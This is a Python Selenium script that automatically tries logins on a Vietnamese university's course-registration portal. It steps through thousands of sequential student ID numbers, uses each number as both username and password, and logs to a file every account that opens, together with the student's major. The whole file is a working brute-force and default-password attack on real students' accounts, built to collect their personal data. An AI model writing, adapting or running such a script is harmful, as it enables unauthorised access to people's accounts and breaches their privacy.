from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

options = webdriver.ChromeOptions()
options.add_experimental_option("detach", True)

BATCH_SIZE = 50
KHTN_RANGES = [(18000000, 18002500), (19000000, 19002500), (20000000, 20002500), (21000000, 21002500), (22000000, 22002500)]
MAJORS_XPATH = "//div[@id='divList1']//table/tbody/tr[2]/td[4]"

def login_and_write_result(browser, username, password, file):
    browser.get("https://daotao.vnu.edu.vn/dkmh/login.asp")

    username_element = browser.find_element(By.ID, "txtLoginId")
    password_element = browser.find_element(By.ID, "txtPassword")

    username_element.send_keys(username)
    password_element.send_keys(password)
    password_element.send_keys(Keys.ENTER)

    url = browser.current_url
    if url != "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
        majors = get_student_majors(browser)
        file.write(f"{username} - {majors}\n")
    
    # log
    print(f"Tried {username}")

def get_student_majors(browser):
    study_results_element = browser.find_element(By.ID, "PortalModule_386")
    study_results_element.click()

    outer_iframe = browser.find_element(By.ID, "ifrRight")
    browser.switch_to.frame(outer_iframe)
    inner_iframe = browser.find_element(By.ID, "ifrSiteManager")
    browser.switch_to.frame(inner_iframe)

    scores_exist = True
    scores_table_element = browser.find_element(By.ID, "divList3")

    try:
        scores_element = scores_table_element.find_element(By.ID, "divList4")
    except:
        scores_exist = False
        pass

    if not scores_exist:
        majors = browser.find_element(By.XPATH, MAJORS_XPATH).text
        return majors
    else:
        return "False"
    
if __name__ == "__main__":
    count = 0
    chrome = webdriver.Chrome(options=options)

    r1700 = [(23000000, 23002500)]
    for start, end in r1700:
        output = open('KHTN-2300.txt', mode='a', encoding='utf-8')        
        for msv in range(start, end):
            if count >= BATCH_SIZE:
                chrome.close()
                print("..reload..")
                chrome = webdriver.Chrome(options=options)
                login_and_write_result(chrome, msv, msv, output)
                count = 0
                count += 1            
            else:
                login_and_write_result(chrome, msv, msv, output)
                count += 1
        output.close()
